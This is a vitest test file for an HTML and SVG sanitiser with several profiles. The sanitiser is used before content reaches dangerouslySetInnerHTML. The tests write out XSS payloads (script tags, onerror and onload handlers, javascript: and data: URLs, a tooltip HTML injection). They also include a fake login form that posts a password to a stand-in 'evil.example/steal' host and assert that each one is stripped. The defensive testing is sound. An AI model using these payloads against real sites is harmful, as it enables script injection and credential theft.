import { describe, expect, it } from 'vitest'
import {
  isSafeTrixAttachment,
  sanitizeHtml,
  sanitizeMarkdownHtml,
  sanitizeMarkup,
  sanitizeRichText,
  sanitizeSvg,
} from './sanitizeHtml'

/*
 * The shared sanitiser every `dangerouslySetInnerHTML` sink goes through.
 * Each profile is asserted against the payloads of the security report: the
 * script / handler / URL basics, the `data-pr-*` attributes the global
 * tooltip reads (a Markdown value used them to make the tooltip render its
 * own HTML), and what restyles or impersonates the panel around the content.
 */

const TOOLTIP_PAYLOAD = '<span data-pr-tooltip="<img src=x onerror=alert(1)>" data-pr-tooltip-html="true" data-pr-position="top">hover</span>'

describe.each([
  ['richText', sanitizeRichText],
  ['markdown', sanitizeMarkdownHtml],
  ['markup', sanitizeMarkup],
] as const)('%s profile: what every profile refuses', (_name, sanitize) => {
  it('removes scripts, event handlers and javascript: URLs', () => {
    const html = sanitize('<p onclick="alert(1)">a</p><script>alert(2)</script><img src=x onerror="alert(3)"><a href="javascript:alert(4)">x</a>')

    expect(html).not.toContain('<script')
    expect(html.toLowerCase()).not.toContain('onclick')
    expect(html.toLowerCase()).not.toContain('onerror')
    expect(html.toLowerCase()).not.toContain('javascript:')
    expect(html).toContain('<p>a</p>')
  })

  it('removes every data-pr-* attribute, keeping the element', () => {
    const html = sanitize(TOOLTIP_PAYLOAD)

    expect(html).not.toContain('data-pr-')
    expect(html).not.toContain('onerror')
    expect(html).toContain('hover')
  })

  it('removes the other data-* attributes', () => {
    const html = sanitize('<p data-anything="1" data-martis-action="x">a</p>')

    expect(html).not.toContain('data-')
    expect(html).toContain('<p>a</p>')
  })

  it('keeps the plain formatting', () => {
    const html = sanitize('<p>a <strong>b</strong> <em>c</em> <code>d</code> <a href="https://example.com/x">e</a></p><ul><li>f</li></ul>')

    expect(html).toContain('<strong>b</strong>')
    expect(html).toContain('<code>d</code>')
    expect(html).toContain('<a href="https://example.com/x">e</a>')
    expect(html).toContain('<li>f</li>')
  })
})

describe.each([
  ['richText', sanitizeRichText],
  ['markdown', sanitizeMarkdownHtml],
] as const)('%s profile: untrusted content', (_name, sanitize) => {
  it('removes the style attribute and element that restyle the page', () => {
    const html = sanitize('<span style="position:fixed;inset:0;z-index:9999">overlay</span><p>x</p><style>body{display:none}</style>')

    expect(html).not.toContain('style')
    expect(html).not.toContain('position')
    expect(html).toContain('overlay')
    expect(html).toContain('<p>x</p>')
  })

  it('removes the form controls that impersonate the panel, and the attributes that submit a form', () => {
    const html = sanitize(
      '<form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form>'
      + '<button form="martis-form" formaction="https://evil.example">x</button><select><option>a</option></select><textarea>t</textarea>',
    )

    expect(html).not.toContain('<form')
    expect(html).not.toContain('<button')
    expect(html).not.toContain('<select')
    expect(html).not.toContain('<textarea')
    expect(html).not.toContain('action')
    expect(html).not.toContain('formaction')
  })

  it('removes id and name, which would collide with an id the app looks up', () => {
    const html = sanitize('<a id="main-content" name="martis-root">x</a>')

    expect(html).not.toContain('id=')
    expect(html).not.toContain('name=')
    expect(html).toContain('>x</a>')
  })

  it('keeps the disabled checkbox of a task list', () => {
    const html = sanitize('<ul><li><input checked="" disabled="" type="checkbox"> done</li></ul>')

    expect(html).toContain('type="checkbox"')
  })
})

describe('richText profile: Trix', () => {
  const attachment = JSON.stringify({ contentType: 'image/png', url: 'https://cdn.example.com/a.png', href: 'https://cdn.example.com/a.png?download', width: 120, height: 80 })
  const figure = (json: string): string =>
    `<figure class="attachment attachment--preview" data-trix-attachment='${json}' data-trix-content-type="image/png" data-trix-attributes='{"presentation":"gallery"}'>`
    + '<img src="https://cdn.example.com/a.png" width="120" height="80"><figcaption class="attachment__caption">a.png</figcaption></figure>'

  it('keeps an attachment with the attributes the display reads', () => {
    const html = sanitizeRichText(figure(attachment))

    expect(html).toContain('<figure')
    expect(html).toContain('<figcaption')
    expect(html).toContain('data-trix-attachment')
    expect(html).toContain('data-trix-content-type="image/png"')
    expect(html).toContain('data-trix-attributes')
    expect(html).toContain('class="attachment attachment--preview"')
    expect(html).toContain('src="https://cdn.example.com/a.png"')
  })

  it('keeps an attachment whose URL is a path of the app', () => {
    const html = sanitizeRichText(figure(JSON.stringify({ url: '/storage/a.png', href: '/storage/a.png' })))

    expect(html).toContain('data-trix-attachment')
  })

  it.each([
    ['url', { url: 'javascript:alert(1)' }],
    ['href', { href: 'javascript:alert(1)' }],
    ['a padded scheme', { url: ' \tjava\nscript:alert(1)' }],
    ['a data: URL', { url: 'data:text/html,<script>alert(1)</script>' }],
    ['previewURL', { url: 'https://cdn.example.com/a.png', previewURL: 'javascript:alert(1)' }],
    ['a non-string url', { url: { toString: 'x' } }],
  ])('drops the attachment JSON whose %s is not a web URL', (_label, json) => {
    const html = sanitizeRichText(figure(JSON.stringify(json)))

    expect(html).not.toContain('data-trix-attachment')
    expect(html.toLowerCase()).not.toContain('javascript:')
    // The figure itself and its inline image stay.
    expect(html).toContain('<figure')
    expect(html).toContain('<img')
  })

  it('drops an attachment attribute that is not a JSON object', () => {
    expect(sanitizeRichText(figure('not json'))).not.toContain('data-trix-attachment')
    expect(sanitizeRichText(figure('["javascript:alert(1)"]'))).not.toContain('data-trix-attachment')
  })

  it('knows a safe attachment from an unsafe one', () => {
    expect(isSafeTrixAttachment(attachment)).toBe(true)
    expect(isSafeTrixAttachment('{"filename":"report: Q3.pdf","url":null}')).toBe(true)
    expect(isSafeTrixAttachment('{"url":"javascript:1"}')).toBe(false)
    expect(isSafeTrixAttachment('null')).toBe(false)
    expect(isSafeTrixAttachment('')).toBe(false)
  })

  it('does not let the Trix attributes through the other profiles', () => {
    expect(sanitizeMarkdownHtml(figure(attachment))).not.toContain('data-trix')
    expect(sanitizeMarkup(figure(attachment))).not.toContain('data-trix')
  })
})

describe('markup profile: developer-written fragments', () => {
  it('keeps what help text documents: links, bold, code, line breaks, inline style', () => {
    const html = sanitizeMarkup('Use <a href="https://example.com/docs">the docs</a>, <b>bold</b>, <code>code</code><br>and <span style="color:red">red</span>')

    expect(html).toContain('<a href="https://example.com/docs">the docs</a>')
    expect(html).toContain('<b>bold</b>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<br>')
    expect(html).toContain('style="color:red"')
  })

  it('keeps a link that opens in a new tab, and never lets it keep the opener', () => {
    const html = sanitizeMarkup('<a href="https://example.com/docs" target="_blank" rel="opener">docs</a>')

    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).not.toContain('rel="opener"')
  })

  it('does not keep target in the untrusted profiles', () => {
    expect(sanitizeMarkdownHtml('<a href="https://example.com" target="_blank">x</a>')).not.toContain('target')
    expect(sanitizeRichText('<a href="https://example.com" target="_blank">x</a>')).not.toContain('target')
  })

  it('still strips a script an application interpolated into it', () => {
    expect(sanitizeMarkup('Hello <img src=x onerror=alert(1)>')).not.toContain('onerror')
  })
})

describe('svg profile', () => {
  // What Endroid's SvgWriter returns for the 2FA setup.
  const qr =
    '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="220px" height="220px" viewBox="0 0 220 220">'
    + '<rect x="0" y="0" width="220" height="220" fill="#ffffff" fill-opacity="1"/>'
    + '<path fill="#000000" fill-opacity="1" d="M11,11L53,11L53,17L11,17ZM65,11L71,11L71,17L65,17Z"/></svg>'

  it('keeps a generated QR code', () => {
    const svg = sanitizeSvg(qr)

    expect(svg).toContain('<svg')
    expect(svg).toContain('viewBox="0 0 220 220"')
    expect(svg).toContain('width="220px"')
    expect(svg).toContain('<rect')
    expect(svg).toContain('fill="#ffffff"')
    expect(svg).toContain('<path')
    expect(svg).toContain('d="M11,11L53,11L53,17L11,17ZM65,11L71,11L71,17L65,17Z"')
    expect(svg).toContain('fill-opacity="1"')
  })

  it('removes scripts and handlers from a vector image', () => {
    const svg = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><rect width="1" height="1" onclick="alert(3)"/></svg>')

    expect(svg).not.toContain('<script')
    expect(svg).not.toContain('onload')
    expect(svg).not.toContain('onclick')
    expect(svg).toContain('<rect')
  })
})

describe('sanitizeHtml', () => {
  it('takes the profile by name', () => {
    expect(sanitizeHtml('<p style="color:red" onclick="x()">a</p>', 'markdown')).toBe('<p>a</p>')
    expect(sanitizeHtml('<p style="color:red" onclick="x()">a</p>', 'markup')).toBe('<p style="color:red">a</p>')
  })

  it('keeps one profile\'s hooks out of another: the Trix attachment rule is the richText profile\'s own', () => {
    const html = '<figure data-trix-attachment=\'{"url":"javascript:alert(1)"}\'></figure>'

    expect(sanitizeRichText(html)).not.toContain('data-trix-attachment')
    // The markdown profile has no such attribute at all, so it is gone too, but never through a Trix hook.
    expect(sanitizeMarkdownHtml(html)).not.toContain('data-trix-attachment')
  })
})
